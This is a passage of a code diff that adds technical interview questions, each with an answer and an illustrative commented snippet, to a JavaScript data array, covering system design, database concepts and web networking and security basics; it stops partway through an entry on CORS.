@@ -531,5 +531,681 @@ function normalAdd(a) {
 
 const normalAdd5 = normalAdd(5);
 console.log(normalAdd5(7)); // 12`
+    },
+
+    // --- SYSTEM DESIGN ---
+    {
+        id: "sys-1",
+        category: "System Design",
+        question: "Explain Scalability Basics.",
+        answer: "Scalability is the property of a system to handle a growing amount of work by adding resources to the system. A system is scalable if its performance improves proportionally with the added capacity.",
+        snippet: `// Handwritten notes:
+// Goals of Scalability:
+// 1. Handle increased load (traffic/data).
+// 2. Maintain or improve latency (speed).
+// 3. Ensure high availability (avoid single point of failure).
+
+// Basic Concept:
+// [User] --> [App Server] (Bottleneck!)
+//           /        \\
+//   [Scaling Up]   [Scaling Out]
+//   (Better CPU)    (More Servers)`
+    },
+    {
+        id: "sys-2",
+        category: "System Design",
+        question: "What is the difference between Horizontal vs Vertical Scaling?",
+        answer: "Vertical Scaling (Scaling Up) means adding more hardware power (CPU, RAM, SSD) to an existing machine. Horizontal Scaling (Scaling Out) means adding more machines/nodes into your pool of resources.",
+        snippet: `// Vertical Scaling (Scale Up)
+// [ Server (2GB) ] ---> [ Server (16GB) ]
+// * Pros: Simple to implement, no code changes needed.
+// * Cons: Hard hardware limit, single point of failure (SPOF), downtime during upgrade.
+
+// Horizontal Scaling (Scale Out)
+// [ Server ] ---> [ Server 1 ] + [ Server 2 ] + [ Server 3 ]
+// * Pros: Infinite scaling, resilient to node failures (no SPOF).
+// * Cons: Complex architecture, requires load balancer, data consistency is challenging.`
+    },
+    {
+        id: "sys-3",
+        category: "System Design",
+        question: "Explain Load Balancing and its common algorithms (Round Robin, Least Connections).",
+        answer: "A Load Balancer acts as a \"traffic cop\" sitting in front of your servers, routing client requests across all servers to ensure no single server bears too much demand, thus improving responsiveness and availability.",
+        snippet: `// Load Balancer Flowchart:
+//                [Client 1]  [Client 2]  [Client 3]
+//                     \\          |          /
+//                      v          v          v
+//                   (   Load Balancer (Nginx/ALB)   )
+//                      /          |          \\
+//                     v           v           v
+//             [Server A]     [Server B]     [Server C]
+
+// Algorithms:
+// 1. Round Robin: Distributes requests sequentially.
+//    (Req 1 -> A, Req 2 -> B, Req 3 -> C, Req 4 -> A...)
+//    Ideal for: Servers with identical specs and similar requested task loads.
+
+// 2. Least Connections: Sends request to the server with the fewest active connections.
+//    Ideal for: Apps with long-lived connections (e.g. Chat sockets) or variable-time requests.`
+    },
+    {
+        id: "sys-4",
+        category: "System Design",
+        question: "What are Stateless vs Stateful services?",
+        answer: "Stateless services treat each request as completely independent; no session data is stored locally on the server between requests. Stateful services store session state locally across multiple requests from the same client.",
+        snippet: `// ❌ Stateful Architecture (Hard to Scale Horizontally)
+// 1. User logs into Server A -> Server A stores { User: Active } in local RAM.
+// 2. User makes request, Load Balancer routes to Server B.
+// 3. Server B doesn't know User -> User logged out!
+// Fix: Requires "Sticky Sessions" at LB level.
+
+// ✅ Stateless Architecture (Ideal for Scaling)
+// 1. User logs in -> Backend signs a JWT (JSON Web Token) and sends it to Client.
+// 2. User sends request to Server B with JWT in Header.
+// 3. Server B validates JWT mathmatically -> User is Auth'd! No local state needed.
+// Fix: Can scale to infinite nodes instantly.
+
+// If State is required (e.g. Cart, live matches), use external centralized state:
+// [Servers A, B, C] <---> [ Redis Cache Shared Cluster ]`
+    },
+    {
+        id: "sys-5",
+        category: "System Design",
+        question: "Explain Cache Locations (Client, CDN, Server, Database).",
+        answer: "Caching stores copies of frequently accessed data in a fast-retrieval layer (like RAM). Caching can be implemented at multiple levels: Client (Browser cache), CDN (Edge servers for static assets), Server (Redis/Memcached for API responses), and Database (Internal DB memory buffer).",
+        snippet: `// Caching Layers Architecture:
+//
+// 1. [ Client / Browser ] -> Caches images, CSS, JS natively.
+//          |
+//          v
+// 2. [    CDN (Cloudflare)    ] -> Caches static assets globally at Edge.
+//          |
+//          v
+// 3. [ App Server (Node.js) ] -> Caches API calculations/DB results.
+//          |   \\______________________
+//          |                          v
+//          v                 [ Redis Server Cache ]
+// 4. [ Database (MongoDB) ] -> Internal buffer cache for reads.`
+    },
+    {
+        id: "sys-6",
+        category: "System Design",
+        question: "Explain common Cache Invalidation Strategies (Write-through, Write-around, Write-back).",
+        answer: "Invalidation ensures stale data is removed from the cache. Write-Through writes to cache and DB simultaneously (safe, but slow writes). Write-Around writes directly to the DB, bypassing cache (cache updated on next read). Write-Back writes ONLY to cache, syncing to DB asynchronously later (fastest writes, high risk of data loss).",
+        snippet: `// Invalidation Strategy Flow:
+
+// --- Write-Through ---
+// App -> writes to -> [Cache] -> synchronously writes to -> [Database]
+// Pros: High data consistency. Cons: Higher write latency.
+
+// --- Write-Around ---
+// App -> writes to -> [Database] (Cache is bypassed)
+// App -> reads from -> [Cache] (MISS) -> reads from -> [Database] -> updates [Cache]
+// Pros: Cache isn't flooded with data that isn't read immediately. 
+
+// --- Write-Back (Write-Behind) ---
+// App -> writes to -> [Cache] (ACK sent immediately to App)
+// [Cache] -> asynchronously writes to -> [Database]
+// Pros: Extremely low write latency. Cons: If Cache node dies before sync, data is completely lost.`
+    },
+    {
+        id: "sys-7",
+        category: "System Design",
+        question: "What are Cache Eviction Policies? Detail LRU vs LFU.",
+        answer: "When a cache (RAM) fills up, it must evict old items. LRU (Least Recently Used) removes data that hasn't been accessed for the longest time. LFU (Least Frequently Used) removes data that has the lowest total access count over time.",
+        snippet: `// --- LRU (Least Recently Used) ---
+// Triggers eviction based on TIME of last access.
+// Cache Limit: 3 items.
+// Insert A, B, C -> Cache: [C, B, A] (Most recent first)
+// Read A         -> Cache: [A, C, B] (A moves to front)
+// Insert D       -> Cache: [D, A, C] (B is evicted because it's oldest)
+
+// --- LFU (Least Frequently Used) ---
+// Triggers eviction based on TOTAL COUNT of accesses.
+// Cache:
+// Item A (Accessed 100 times)
+// Item B (Accessed 50 times)
+// Item C (Accessed 2 times)
+// If Cache is full and 'D' is added, 'C' is evicted regardless of when 'C' was last read.`
+    },
+    {
+        id: "sys-8",
+        category: "System Design",
+        question: "What is the difference between Redis and Memcached?",
+        answer: "Memcached is strictly an in-memory key-value store optimized for simple, fast caching of short strings/objects. Redis is an in-memory data structure store that supports complex types (Lists, Sets, Hashes) and offers disk persistence (snapshots) ensuring data survives a server reboot. Memcached is volatile (data wiped on restart).",
+        snippet: `// Key Differences:
+// 
+// Feature          | Memcached                  | Redis
+// -----------------|----------------------------|------------------------
+// Data Types       | Strings only               | Strings, Hashes, Lists, Sets
+// Persistence      | None (Volatile RAM)        | Yes (RDB Snapshots / AOF logs)
+// Threading Model  | Multi-threaded             | Single-threaded (Event Loop)
+// Pub/Sub          | No                         | Yes (Message Broker features)
+// typical Use Case | Pure high-speed HTML cache | Caching + Sessions + Queues`
+    },
+    {
+        id: "sys-9",
+        category: "System Design",
+        question: "Interview Tricky: What is the 'Cache Thundering Herd' (Cache Stampede) problem and how do you fix it?",
+        answer: "A Cache Stampede occurs when a highly requested cache key expires simultaneously while under heavy traffic. Thousands of requests instantly miss the cache, hitting the database exactly at the same time, potentially crashing it. You fix it using a Mutex Lock (only allowing one thread to re-compute the DB value while others wait) or Probabilistic Early Expiration.",
+        snippet: `// The Thundering Herd Problem:
+// 
+// 1. Key "Popular_Product" expires at 12:00:00.
+// 2. 12:00:01 -> 10,000 users request "Popular_Product".
+// 3. Cache Miss for all 10,000 requests.
+// 4. All 10,000 requests hit the MongoDB query simultaneously -> DATABASE CRASH.
+//
+// Mutex Lock Solution (Debouncing):
+// if (Cache.get(key) == null) {
+//    if (Cache.acquireLock(key)) {
+//       let data = DB.query();
+//       Cache.set(key, data);
+//       Cache.releaseLock(key);
+//    } else {
+//       wait(50ms) and retry reading Cache.
+//    }
+// }`
+    },
+    {
+        id: "sys-10",
+        category: "System Design",
+        question: "How do you scale a database? Explain Master-Slave vs Master-Master Replication.",
+        answer: "Replication involves copying data across multiple databases to improve availability and read scaling. In Master-Slave, writes only go to the single Master, which syncs to Read-Only Slaves (solves read-heavy scaling but Master is a SPOF). In Master-Master, any node can accept writes, requiring complex conflict resolution (high availability for both reads/writes but prone to sync collisions).",
+        snippet: `// --- Master-Slave (Single Leader) ---
+// [ App ] --(Writes/Reads)--> [ Master DB ]
+//                               |      |
+//                         (async log sync)
+//                               v      v
+// [ App ] --(Reads Only)---> [ Slave 1 ] [ Slave 2 ]
+// * Ideal for: Read-heavy applications (95% Reads / 5% Writes). Like Twitter feeds.
+
+// --- Master-Master (Multi-Leader) ---
+// [ App ] --(Writes/Reads)--> [ Master A ] <--(2-way sync)--> [ Master B ] <--(Writes/Reads)-- [ App ]
+// * Ideal for: High availability across global regions (e.g., US Master and EU Master).
+// * Risk: Split-brain (network failure breaks sync resulting in conflicting data).`
+    },
+    {
+        id: "sys-11",
+        category: "System Design",
+        question: "Explain Database Sharding (Data Partitioning).",
+        answer: "Sharding is horizontal scaling strictly for the database layer. Instead of replicating the entire dataset, you partition (split) the massive SQL/NoSQL table into smaller, independent chunks (shards) spread across entirely different physical DB servers based on a Routing Key (like UserID % N).",
+        snippet: `// Horizontal Partitioning (Sharding)
+// Problem: 1 Table has 10 Billion Rows. Queries are insanely slow.
+// Solution: Split table by routing key.
+//
+// Routing Logic: shard_id = userID % 3
+//
+// [ App Router ]
+//       |
+//       |--- user 1, 4, 7 ---> [ Shard 1 DB (Server A) ]
+//       |--- user 2, 5, 8 ---> [ Shard 2 DB (Server B) ]
+//       |--- user 3, 6, 9 ---> [ Shard 3 DB (Server C) ]
+//
+// Cons: 
+// 1. Joins across different shards are virtually impossible/devastatingly slow.
+// 2. "Celebrity Problem" (Hotspot) - One shard gets 90% of traffic if data is skewed.`
+    },
+    {
+        id: "sys-12",
+        category: "System Design",
+        question: "What is Database Connection Pooling and why is it mandatory for Backend APIs?",
+        answer: "Opening and closing a TCP network connection and completing the DB authentication handshake for every single HTTP request is extremely slow and resource-heavy. A Connection Pool keeps a cache of pre-authenticated, ready-to-use active database connections. When a request comes in, it instantly 'borrows' an idle connection and returns it when finished.",
+        snippet: `// Without Pooling (Disaster at Scale):
+// Req 1 -> Open TCP -> SSL Handshake -> Auth -> Query -> Close TCP (Takes 200ms)
+// Req 2 -> Open TCP -> SSL Handshake -> Auth -> Query -> Close TCP (Takes 200ms)
+
+// With Connection Pooling (Standard):
+// Pool: [ IdleConn1, IdleConn2, IdleConn3 ] (Pre-warmed on server boot)
+// 
+// Req 1 -> Borrows IdleConn1 -> Query -> Returns IdleConn1 to Pool (Takes 5ms)
+// Req 2 -> Borrows IdleConn2 -> Query -> Returns IdleConn2 to Pool (Takes 5ms)
+
+// Node.js Postgres (pg) Example:
+// const { Pool } = require('pg');
+// const pool = new Pool({ max: 20, idleTimeoutMillis: 30000 });
+// 
+// // The app borrows from the pool automatically:
+// const res = await pool.query('SELECT * FROM users WHERE id = $1', [1]);`
+    },
+    {
+        id: "sys-13",
+        category: "System Design",
+        question: "REST vs GraphQL: When would you use one over the other?",
+        answer: "REST uses predefined endpoints returning fixed data structures (Over-fetching/Under-fetching). GraphQL uses a single endpoint where the client explicitly specifies the exact shape of the data it needs. Use REST for simple, cacheable, standardized services. Use GraphQL for complex UIs (like mobile apps) needing aggregated data from multiple microservices simultaneously.",
+        snippet: `// --- REST (Multiple Endpoints) ---
+// GET /users/123 -> Gets user object
+// GET /users/123/posts -> Gets user's posts
+// * Rigid. Usually returns more data than needed (Over-fetching).
+
+// --- GraphQL (Single Endpoint) ---
+// POST /graphql
+// Request Body:
+// query {
+//   user(id: 123) {
+//     name
+//     posts {
+//       title
+//     }
+//   }
+// }
+// * Flexible. Returns exactly \`name\` and \`title\`. No more, no less.`
+    },
+    {
+        id: "sys-14",
+        category: "System Design",
+        question: "How do you protect your APIs? Explain Rate Limiting and API Versioning.",
+        answer: "Rate Limiting restricts the number of requests a user/IP can make in a time window to prevent DDoS attacks or server overload (often implemented via Redis Token Bucket/Leaky Bucket). API Versioning ensures backend updates don't break existing older clients by scoping changes to specific route paths or request headers.",
+        snippet: `// --- Rate Limiting (Token Bucket Concept) ---
+// [ Client ] --> ( 5 tokens max, refills 1 token/sec ) --> [ API ]
+// * If Client makes 6 requests instantly, the 6th is rejected (HTTP 429 Too Many Requests).
+
+// --- API Versioning Strategies ---
+// 1. URI Routing (Most Common):
+//    GET /api/v1/users (Returns old schema)
+//    GET /api/v2/users (Returns new schema with breaking changes)
+
+// 2. Custom Header:
+//    GET /api/users
+//    Header -> Accept-Version: v2.0`
+    },
+    {
+        id: "sys-15",
+        category: "System Design",
+        question: "Explain Message Brokers. What are the core differences between RabbitMQ and Apache Kafka?",
+        answer: "Message Brokers decouple microservices by allowing them to communicate asynchronously via queues/streams. RabbitMQ is a traditional message queue (Smart Broker, Dumb Consumer) focusing on complex routing and delivering messages once. Kafka is a distributed event streaming platform (Dumb Broker, Smart Consumer) focusing on high-throughput, real-time data ingestion, and retaining a persistent replayable log of events.",
+        snippet: `// --- RabbitMQ (Message Queue) ---
+// Best for: Transactional, task-based workloads (e.g., sending an email).
+// Mechanism: Push-based. The broker pushes messages to consumers.
+// State: Once a consumer ACKs the message, RabbitMQ permanently deletes it.
+//
+// [ Service A ] -> (Exchange -> Queue) -> pushes to -> [ Service B ] (Deletes MSG)
+
+// --- Apache Kafka (Event Stream) ---
+// Best for: Enormous data pipelines, analytics, log aggregation.
+// Mechanism: Pull-based. Consumers constantly poll the broker for new data.
+// State: Messages are persisted on disk for a set time (e.g., 7 days).
+// Multiple different services can replay the exact same stream of events.
+//
+// [ Service A ] -> (Append to Partition Log)
+//                      ^          ^
+//                      |          |
+//                [ Service B ] [ Service C (Replaying from yesterday) ]`
+    },
+
+    // --- DATABASE MANAGEMENT SYSTEMS & SQL ---
+    {
+        id: "dbms-1",
+        category: "Database Systems",
+        question: "Explain SQL JOINs (INNER, LEFT, RIGHT, FULL OUTER).",
+        answer: "JOINs combine rows from two or more tables based on a related column. INNER joins return only matching rows. LEFT joins return all rows from the left table + matching rows from the right (null if no match). RIGHT joins do the reverse. FULL OUTER joins return all rows when there is a match in either table.",
+        snippet: `// INNER JOIN: (Intersection)
+// Returns mathematically overlapping User & Order data.
+// SELECT * FROM Users INNER JOIN Orders ON Users.id = Orders.user_id;
+
+// LEFT JOIN: (Include all Left)
+// Returns ALL Users. If a user has an order, it returns it. If not, Order columns = NULL.
+// SELECT * FROM Users LEFT JOIN Orders ON Users.id = Orders.user_id;
+
+// FULL OUTER JOIN: (Union)
+// Returns everything. Unmatched rows on either side contain NULLs.
+// SELECT * FROM Users FULL OUTER JOIN Orders ON Users.id = Orders.user_id;`
+    },
+    {
+        id: "dbms-2",
+        category: "Database Systems",
+        question: "SQL Functions: GROUP BY, HAVING vs WHERE, Window Functions (ROW_NUMBER).",
+        answer: "WHERE filters rows BEFORE grouping. GROUP BY aggregates identical data into summary rows (using SUM/COUNT/AVG). HAVING filters rows AFTER grouping. Window Functions (like ROW_NUMBER, RANK, LAG) perform calculations across a set of table rows directly related to the current row without collapsing them into a single output row.",
+        snippet: `// Example: Find departments where the AVERAGE salary is > $50k.
+// WHERE cannot be used on an aggregate like AVG()!
+//
+// SELECT department, AVG(salary) as AvgSal 
+// FROM Employees 
+// WHERE status = 'active'     <-- Pre-filter
+// GROUP BY department         <-- Aggregate
+// HAVING AVG(salary) > 50000; <-- Post-filter
+
+// Window Function Example (ROW_NUMBER):
+// Assigns a sequential integer to each row within the partition of a result set.
+// SELECT id, name, salary, 
+//        ROW_NUMBER() OVER (PARTITION BY department ORDER BY salary DESC) as rank
+// FROM Employees;`
+    },
+    {
+        id: "dbms-3",
+        category: "Database Systems",
+        question: "Explain Database Normalization (1NF, 2NF, 3NF). When do you denormalize?",
+        answer: "Normalization minimizes data redundancy by splitting large tables into smaller related ones using primary/foreign keys. 1NF: Atomic values (no arrays in columns). 2NF: 1NF + no partial dependencies (every non-key attribute fully depends on the entire primary key). 3NF: 2NF + no transitive dependencies (non-key attributes cannot depend on other non-key attributes). You De-normalize (intentionally duplicate data) when heavy JOINs drastically slow down read performance.",
+        snippet: `// --- 1NF Violation (Non-Atomic) ---
+// User | PhoneNumbers (Array)
+// John | [555-1234, 555-9876]
+// Fix: Create separate 'UserPhones' table with 1 phone number per row.
+
+// --- 3NF Transitive Violation ---
+// OrderID | CustomerID | CustomerZipCode | CustomerState
+// Issue: 'CustomerState' inherently depends on 'CustomerZipCode', not just the 'OrderID'.
+// Fix: Move ZipCode/State to a distinct 'Location' table mapped by CustomerID.
+
+// Denormalization:
+// Sometimes joining Users -> Orders -> Items -> Products takes 500ms.
+// Denormalization intentionally adds the Product Name directly to the Orders table to skip the join.`
+    },
+    {
+        id: "dbms-4",
+        category: "Database Systems",
+        question: "Explain B-Tree Indexes vs Hash Indexes. What are Clustered vs Non-Clustered Indexes?",
+        answer: "B-Tree indexes sort data hierarchically allowing incredibly fast range queries (WHERE age > 20). Hash indexes map keys directly to O(1) locations but only support equality queries (WHERE age = 20). A Clustered Index literally determines the physical sort order of rows on the hard drive (only 1 per table, usually Primary Key). A Non-Clustered Index stores logical pointers pointing precisely back to the physical data rows (you can have many).",
+        snippet: `// B-Tree Architecture (O(log n) lookup):
+//          [ 50 ]
+//         /      \\
+//     [ 20 ]    [ 80 ]
+//      /  \\      /  \\
+//   [10] [30]  [60] [90]  <-- Leaf nodes physically point to the data.
+
+// Index Downside:
+// 1. Every time you INSERT/UPDATE/DELETE data, the DB must physically update the B-Tree index. 
+// 2. Indexes massively speed up Reads, but noticeably slow down Writes.
+// 3. DO NOT index every column. Only index heavily searched foreign keys or WHERE clauses.`
+    },
+    {
+        id: "dbms-5",
+        category: "Database Systems",
+        question: "Describe ACID properties in Database Transactions. What are Isolation Levels?",
+        answer: "ACID ensures transaction safety. Atomicity (All or Nothing: if 1 step fails, roll back completely). Consistency (Data must meet schema rules/constraints). Isolation (Parallel transactions don't interfere with each other). Durability (Committed data survives physical power loss). Isolation Levels control the strictness of parallel reads: Read Uncommitted, Read Committed, Repeatable Read, and Serializable.",
+        snippet: `// Transaction Flow (Atomicity)
+// BEGIN TRANSACTION;
+// UPDATE Accounts SET balance = balance - 100 WHERE id = 'A';
+// UPDATE Accounts SET balance = balance + 100 WHERE id = 'B';
+// COMMIT; (If server crashes mid-way, DB rolls back both).
+
+// Isolation Dirty Read Problem (Level: Read Uncommitted):
+// Transaction 1 updates A's balance but hasn't committed yet.
+// Transaction 2 reads A's new balance.
+// Transaction 1 encounters an error and ROLLS BACK.
+// Transaction 2 now possesses invalid "Dirty" data that never actually existed!
+// Fix: Set level to "Read Committed" (default in Postgres).`
+    },
+    {
+        id: "dbms-6",
+        category: "Database Systems",
+        question: "Explain Concurrency Control & The N+1 Query Problem.",
+        answer: "Concurrency Control manages simultaneous DB access using Lock mechanisms: Shared Locks allow parallel reads but block writes, Exclusive Locks block both reads and writes. Optimistic Locking assumes no conflicts and checks versions before saving; Pessimistic physically locks the row immediately. N+1 Problem is a performance flaw where grabbing a list of parents (1 query) triggers a separate single query for each child's data (N queries).",
+        snippet: `// Pessimistic Lock (Row Level) - Prevents others from touching it:
+// SELECT * FROM Tickets WHERE status = 'available' LIMIT 1 FOR UPDATE;
+// (Locks the exact ticket row purely for the current transaction until COMMIT).
+
+// N+1 Problem Execution (ORM Flaw):
+// const users = await User.find();      // 1 Query (Returns 100 users)
+// for(let user of users) {
+//    console.log(await user.getPosts()) // 100 Individual Queries! (N queries)
+// }
+// TOTAL DANGER: 101 database queries executed.
+
+// Solution: Eager Loading / Joins (Executes in exactly 2 queries combined)
+// const users = await User.find({ include: 'posts' });`
+    },
+    {
+        id: "dbms-7",
+        category: "Database Systems",
+        question: "Explain CAP Theorem & SQL vs NoSQL. When to use which?",
+        answer: "CAP Theorem states a distributed data store can only provide two of three guarantees: Consistency (all nodes see the exact same data simultaneously), Availability (every request receives a response quickly), and Partition Tolerance (system continues despite network drop/split). SQL is ACID-compliant (CA/CP focused) strictly utilizing structured relations. NoSQL is loosely structured (AP focused - Eventual Consistency) prioritizing massive horizontal scale.",
+        snippet: `// When to use Relational SQL (Postgres, MySQL):
+// 1. Data has strict schema structures & requires high data integrity (Banking).
+// 2. Heavy multi-table relationship JOINs.
+// 3. ACID transactional guarantees are critical.
+
+// When to use NoSQL (MongoDB, DynamoDB, Cassandra):
+// 1. Data schema is entirely unpredictable or rapidly changing (IoT sensors, JSON payloads).
+// 2. Need to infinitely scale Horizontally across global clusters instantly.
+// 3. Storing heavily nested JSON objects natively.
+
+// NoSQL Types:
+// Document: MongoDB (Stores nested JSON-like BSON logic)
+// Key-Value: Redis (Stores pure strings in RAM)
+// Column: Cassandra (Stores data dynamically in massive sparse columns, high write speed)
+// Graph: Neo4j (Stores natively linked node-relationships mapping social networks)`
+    },
+
+    // --- COMPUTER NETWORKS & PROTOCOLS ---
+    {
+        id: "net-1",
+        category: "Computer Networks & Protocols",
+        question: "Explain the core HTTP Methods: GET, POST, PUT, DELETE, and PATCH.",
+        answer: "GET retrieves data (should be idempotent and read-only). POST creates a new resource (not idempotent). PUT completely replaces an existing resource (if it doesn't exist, it creates it). PATCH partially updates an existing resource (modifying only specific fields). DELETE completely removes a resource.",
+        snippet: `// --- HTTP Method Semantics ---
+
+// GET /api/users/123
+// Safe & Idempotent (Calling it 10x yields the same DB state).
+// Never send sensitive data in a GET URL query string.
+
+// POST /api/users
+// Body: { name: 'Alice' }
+// NOT Idempotent (Calling it 10x creates 10 different Alices).
+
+// PUT /api/users/123
+// Body: { name: 'Alice', age: 30 }
+// Overwrites the ENTIRE user object. Replaces missing fields with Null.
+
+// PATCH /api/users/123
+// Body: { age: 31 }
+// ONLY updates the age field. Leaves 'name' and other fields untouched.`
+    },
+    {
+        id: "net-2",
+        category: "Computer Networks & Protocols",
+        question: "Explain the importance of standard HTTP Status Codes (2xx, 4xx, 5xx).",
+        answer: "Status codes instantly inform the client of the result without parsing the body. 2xx indicates Success (200 OK, 201 Created). 4xx indicates Client Errors (400 Bad Request, 401 Unauthorized [needs login], 403 Forbidden [lacks admin role], 404 Not Found). 5xx indicates Server Errors (500 Internal Error, 502 Bad Gateway).",
+        snippet: `// Express.js Status Code Examples:
+
+// 201 Created (Perfect for successful POSTs)
+// res.status(201).json({ message: "User successfully registered" });
+
+// 400 Bad Request (Client sent invalid data/missing fields)
+// res.status(400).json({ error: "Password must be > 8 chars" });
+
+// 401 Unauthorized vs 403 Forbidden
+// 401: "I don't know who you are. Please log in."
+// 403: "I know who you are, but you aren't an Admin so you can't view this."
+
+// 500 Internal Server Error (Uncaught exception in DB/Backend logic)
+// console.error(error);
+// res.status(500).json({ error: "Database connection failed" });`
+    },
+    {
+        id: "net-3",
+        category: "Computer Networks & Protocols",
+        question: "What are HTTP Headers? Describe Authorization, Content-Type, and Cache-Control.",
+        answer: "Headers are key-value string pairs sent in the HTTP request/response carrying metadata. Authorization carries credentials (like a Bearer JWT). Content-Type tells the receiver how to parse the body (e.g., application/json or multipart/form-data). Cache-Control dictates caching policies for proxies and browsers (e.g., max-age=3600).",
+        snippet: `// Standard Client Request Headers:
+// GET /api/dashboard HTTP/1.1
+// Host: api.example.com
+// Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI...  <-- The JWT Token
+// Accept: application/json
+// User-Agent: Mozilla/5.0...
+
+// Standard Server Response Headers:
+// HTTP/1.1 200 OK
+// Content-Type: application/json; charset=utf-8      <-- "Parse my body as JSON"
+// Cache-Control: public, max-age=86400               <-- "Browser, cache this for 1 day"
+// Set-Cookie: sessionID=abc1234; HttpOnly; Secure    <-- Secures auth cookie`
+    },
+    {
+        id: "net-4",
+        category: "Computer Networks & Protocols",
+        question: "Compare HTTP vs HTTPS and HTTP/1.1 vs HTTP/2.",
+        answer: "HTTP sends data in pure plaintext. HTTPS encrypts the connection using TLS/SSL, ensuring data privacy and preventing Man-in-the-Middle attacks. HTTP/1.1 is strictly synchronous, opening one TCP connection per asset. HTTP/2 introduces Multiplexing (sending multiple assets over a single TCP connection concurrently), Header Compression (HPACK), and Server Push.",
+        snippet: `// Why HTTP/2 is drastically faster for Web Apps:
+
+// --- HTTP/1.1 (Head-of-Line Blocking) ---
+// TCP Connection 1: Sends HTML
+// TCP Connection 2: Sends CSS
+// TCP Connection 3: Sends JS (Fails) <-- Everything halts waiting for this.
+// Browsers limit max ~6 TCP connections per domain.
+
+// --- HTTP/2 (Multiplexed Streams) ---
+// Single TCP Connection:
+//  [ Frame: CSS Chunk 1 ] [ Frame: JS Chunk 1 ] [ Frame: Image Chunk 1 ]
+//  [ Frame: CSS Chunk 2 ] [ Frame: JS Chunk 2 ] [ Frame: Image Chunk 2 ]
+// Data is interleaved in binary frames asynchronously avoiding the bottleneck.`
+    },
+    {
+        id: "net-5",
+        category: "Computer Networks & Protocols",
+        question: "Authentication State: Cookies vs Sessions vs Tokens (JWT).",
+        answer: "Cookies are small string files stored entirely on the Client browser, passed automatically on every request. Sessions are completely Stateful: the Server stores the user's data locally in RAM/Redis, and only gives the Client a tiny reference 'SessionID'. Tokens (JWTs) are completely Stateless: the Server cryptographically signs the user's data directly into the Token, gives it to the Client, and requires zero database lookups to verify identity later.",
+        snippet: `// Authentication Evolution
+
+// 1. Session Architecture (Stateful)
+// - Client POST Login
+// - Server creates { sessionID: "XYZ", user: "Alice" } and saves to Redis.
+// - Server sends "Set-Cookie: sessionID=XYZ"
+// - Client sends Cookie next request -> Server checks Redis for XYZ -> OK.
+// * Hard to scale horizontally.
+
+// 2. JWT Architecture (Stateless)
+// - Client POST Login
+// - Server hashes { user: "Alice" } with a SECRET_KEY = JWT_String.
+// - Server sends JWT_String to Client (stored in localStorage or HttpOnly Cookie).
+// - Client sends JWT in "Authorization: Bearer" header.
+// - Server does math to verify the signature. NO DB/REDIS lookup required!
+// * scales infinitely.`
+    },
+    {
+        id: "net-6",
+        category: "Computer Networks & Protocols",
+        question: "Explain RESTful API principles (Statelessness, Client-Server, Uniform Interface).",
+        answer: "REST (Representational State Transfer) is an architectural style. Core constraints: 1. Client-Server (separation of UI concerns from data storage). 2. Statelessness (no client context is stored on the server between requests; every request must contain all info needed to understand it). 3. Uniform Interface (resources are identified in requests via standard URIs). 4. Cacheability.",
+        snippet: `// Understanding Statelessness
+//
+// ❌ BAD (Stateful): 
+// Request 1: POST /api/login -> Server creates auth session in RAM.
+// Request 2: GET  /api/profile -> Server remembers Request 1. (Will fail if routed to a different server instance).
+//
+// ✅ GOOD (Stateless REST):
+// Request 1: POST /api/login -> Returns Bearer Token.
+// Request 2: GET  /api/profile (Header: Auth Bearer Token) -> Server immediately verifies cryptographically without checking RAM.`
+    },
+    {
+        id: "net-7",
+        category: "Computer Networks & Protocols",
+        question: "What are Resource-Based URLs and Idempotency in REST?",
+        answer: "Resource-based URLs name the 'thing' (noun) you are interacting with, rather than the action (verb). Idempotency means that making multiple identical requests has the same effect on the server state as making a single request (GET, PUT, DELETE are idempotent; POST is not).",
+        snippet: `// Resource-Based Naming Conventions
+//
+// ❌ BAD (RPC / Action-based):
+// GET /getUsers
+// POST /createUser
+// POST /deleteUser?id=5
+//
+// ✅ GOOD (REST / Resource-based Nouns):
+// GET    /api/users       (Fetch list)
+// POST   /api/users       (Create one)
+// GET    /api/users/5     (Fetch specific user)
+// PUT    /api/users/5     (Completely overwrite user 5 - Idempotent)
+// DELETE /api/users/5     (Delete user 5 - Idempotent)`
+    },
+    {
+        id: "net-8",
+        category: "Computer Networks & Protocols",
+        question: "Explain Web Security Basics: SSL/TLS and JWT.",
+        answer: "SSL (Secure Sockets Layer) and its successor TLS (Transport Layer Security) encrypt the communication channel between client and server using asymmetric cryptography (public/private keys) during the handshake, then switching to symmetric encryption for speed. JWT (JSON Web Token) is a standard for securely transmitting JSON data as a cryptographically signed token.",
+        snippet: `// TLS Handshake Flow (Simplified)
+// 1. Client: "Hello, I want to connect securely. Here are my cipher suites."
+// 2. Server: "Hello. I chose AES-256. Here is my Public SSL Certificate."
+// 3. Client: Verifies Certificate with Root CA. Generates a symmetric 'Session Key', encrypts it with Server's Public Key, and sends it.
+// 4. Server: Decrypts Session Key using its highly guarded Private Key.
+// 5. Connection uses the blazing-fast symmetric Session Key from now on.
+
+// JWT Structure (Header . Payload . Signature)
+// eyJhbGciOiJIUzI1NiJ9 . eyJ1c2VySWQiOjEyM30 . SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`
+    },
+    {
+        id: "net-9",
+        category: "Computer Networks & Protocols",
+        question: "Describe the OAuth 2.0 Authorization Code Flow.",
+        answer: "OAuth 2.0 is an authorization framework (not authentication, though often used for it via OIDC). It allows a user to grant a third-party application limited access to their resources on another site without sharing their password.",
+        snippet: `// OAuth 2.0 (e.g., "Login with Google")
+//
+// 1. You click "Login with Google" on MyApp.com.
+// 2. MyApp redirects you to accounts.google.com with MyApp's Client ID.
+// 3. You log in to Google and click "Allow MyApp to read my email".
+// 4. Google redirects you back to MyApp with a short-lived "Authorization Code" in the URL.
+// 5. MyApp's Backend takes that Code + its secret Client Secret, and POSTs directly to Google's backend.
+// 6. Google verifies the Code/Secret and responds with an Access Token.
+// 7. MyApp backend uses the Access Token to fetch your email from Google's API.`
+    },
+    {
+        id: "net-10",
+        category: "Computer Networks & Protocols",
+        question: "What are CORS, CSRF, and XSS?",
+        answer: "CORS (Cross-Origin Resource Sharing) is a browser security mechanism that blocks requests made to a different domain unless the server explicitly allows it. CSRF (Cross-Site Request Forgery) tricks an authenticated user into executing unwanted actions (prevented via CSRF Anti-forgery tokens). XSS (Cross-Site Scripting) is injecting malicious client-side JavaScript into a website to steal cookies/tokens (prevented by sanitizing inputs and using HttpOnly cookies).",
+        snippet: `// 1. CORS Scenario:
+// Frontend runs on localhost:3000. API runs on localhost:5000.
+// Browser blocks the fetch() request unless localhost:5000 explicitly sends header:
